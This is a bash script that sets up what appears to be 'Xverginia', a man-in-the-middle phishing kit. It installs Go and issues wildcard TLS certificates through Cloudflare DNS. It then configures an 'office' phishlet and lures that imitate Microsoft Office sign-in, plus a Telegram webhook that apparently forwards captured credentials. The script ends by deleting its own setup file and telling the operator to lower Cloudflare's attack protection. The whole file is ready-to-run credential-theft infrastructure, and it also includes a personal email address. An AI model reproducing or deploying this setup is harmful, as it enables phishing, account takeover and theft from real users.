#!/bin/bash

###########################
###		      AkaMs        ##
###########################
##colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

#Logging functions
log_info() {
  echo -e "${BLUE}[INFO]:  $1${NC}"
}

log_success() {
  echo -e "${GREEN}[SUCCESS]:  $1${NC}"
}

log_warning() {
  echo -e "${YELLOW}[WARNING]:  $1${NC}"
}

log_error() {
  echo -e "${RED}[ERROR]:  $1${NC}"
}

check_error() {
    if [ "$?" -ne 0 ]; then
        log_error "$1"
        exit 1
    fi
}

uip=$(curl -4 ifconfig.me 2> /dev/null)


###########################
###	   Update Distro     ##
###########################
log_info "Updating Please hold..."
apt update &> /dev/null
log_info "Update Succesfull"


###########################
### Install Requirements ##
###########################
log_info "Installing requirements..."
apt install wget git make unzip -y &> /dev/null
check_error "Error encountered when installing wget git make unzip"
log_info "Installation Succesfull"


###########################
##       Setup GO        ##
###########################
log_info "Setting up Go..."
wget https://go.dev/dl/go1.22.0.linux-amd64.tar.gz &> /dev/null
tar -zxvf go1.22.0.linux-amd64.tar.gz -C /usr/local/ &> /dev/null
check_error "Error encountered when installing go"
log_info "Go Setup Succesfull"


###########################
##   Setup Xverginia     ##
###########################
echo 'export GOPATH=$HOME/go' >> ~/.profile &> /dev/null
echo 'export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin' >> ~/.profile &> /dev/null
source ~/.profile &> /dev/null
unzip 0.0.zip &> /dev/null
log_info "Building..."
cd xverginia &> /dev/null
chmod +x ./build/xverginia &> /dev/null
sudo service systemd-resolved stop
echo -e "nameserver 8.8.8.8\nnameserver 1.1.1.1" | sudo tee /etc/resolv.conf &> /dev/null
rm -rf ~/.acme.sh &> /dev/null
curl https://get.acme.sh | sh -s email=lavonpryor92@gmail.com --force
~/.acme.sh/acme.sh --set-default-ca --server letsencrypt 
export CF_Token="{cf_token}"
~/.acme.sh/acme.sh --issue --dns dns_cf \
  -d {domain} \
  -d '*.{domain}' \
  --keylength ec-256 --force  
mkdir -p /root/.xverginia/crt/sites/{domain}
~/.acme.sh/acme.sh --install-cert -d {domain} \
  --key-file       /root/.xverginia/crt/sites/{domain}/privkey.pem \
  --fullchain-file /root/.xverginia/crt/sites/{domain}/fullchain.pem \
  --ecc --force 
chmod 600 /root/.xverginia/crt/sites/{domain}/*.pem 

cat <<EOF > conf.txt
config ipv4 $uip
config autocert off
config domain {domain}
config webhook_telegram {bot_token}/{telegram_id}
phishlets hostname office {domain}
phishlets enable office
lures delete all
lures create office
lures get-url 0
lures edit 0 hostname {domain}
q
EOF
./build/xverginia -p ./phishlets/ < conf.txt &> /dev/null
check_error "Error encountered when building Xverginia"
log_info "Build was succesfull"


cd ~ &> /dev/null
rm 0.0.zip
rm setup.sh
rm go1.22.0.linux-amd64.tar.gz

if [ $? -eq 0 ]; then
	##final message
cat <<EOF
+++++          Installation comleted          ++++++	

|--------------------------------------------------|
[ .  Add records into your cf ({domain})      ]
|--------------------------------------------------|
| . Type  | . Name  | .   Value      | . proxied   |
|--------------------------------------------------|
| . A     |    @    |  $uip  | .   no    |
|---------------------------------------------------|
| . A     |    *    |  $uip  | .   no    |
|---------------------------------------------------|
|                                                   |
|    Success You can quit the ssh now               |
|                                                   |
|---------------------------------------------------|

Important:
1.) Make sure your 'I'm under attack' is not on
2.) Make sure Security -> Settings -> Security Level is anything below 'Im under attack'
EOF
else
    log_error "An error occurred starting your setup script"
fi
